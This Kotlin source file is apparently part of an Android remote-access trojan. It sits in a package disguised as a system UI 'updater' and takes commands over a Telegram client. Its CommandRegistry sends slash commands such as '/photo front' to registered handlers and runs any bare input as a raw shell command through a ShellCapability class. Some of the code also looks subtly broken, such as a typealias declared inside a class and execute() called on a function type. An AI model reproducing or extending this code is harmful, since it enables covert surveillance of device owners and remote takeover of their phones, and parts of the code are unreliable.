package com.android.systemui.updater

import android.content.Context
import com.android.systemui.updater.TelegramClient
import com.android.systemui.updater.capabilities.ShellCapability

/**
 * Registry for handling commands with proper multi-word command parsing.
 * Commands are registered as single words (e.g., "photo") and inspect args for subcommands.
 */
class CommandRegistry(
    private val ctx: Context,
    private val telegram: TelegramClient
) {

    typealias CommandHandler = (args: String) -> Unit

    private val commands = mutableMapOf<String, CommandHandler>()

    /**
     * Register a command handler.
     * @param command The command word (without slash, e.g., "photo")
     * @param description Help text for the command
     * @param emoji Emoji/icon prefix for help text
     * @param handler Lambda that processes the command args
     */
    fun register(command: String, description: String, emoji: String, handler: CommandHandler) {
        commands[command] = handler
    }

    /**
     * Handle an input string, returning true if command was handled.
     * @param input Raw input string (e.g., "/photo front")
     * @return true if command was found and executed, false otherwise
     */
    fun handle(input: String): Boolean {
        val trimmedInput = input.trim()
        if (trimmedInput.isEmpty()) return false

        val parts = trimmedInput.split(" ", limit = 2)
        val command = parts[0]       // e.g., "/photo" or "photo"
        val args = if (parts.size > 1) parts[1] else ""  // e.g., "front"

        // Step 1: Try exact match on command name in commands map (with slash if present)
        val handler = commands[command]
        if (handler != null) {
            handler.execute(args)
            return true
        }

        // Step 2: If not found and command starts with '/', strip '/' and try again
        if (command.startsWith("/")) {
            val trimmed = command.substring(1)
            val handler2 = commands[trimmed]
            if (handler2 != null) {
                handler2.execute(args)
                return true
            }
        }

        // Step 3: Bare command (no / prefix) → treat as shell command
        if (!command.startsWith("/") && command.isNotEmpty()) {
            // Delegate to ShellCapability for raw shell commands
            ShellCapability(ctx, telegram).run(trimmedInput)
            return true
        }

        return false
    }
}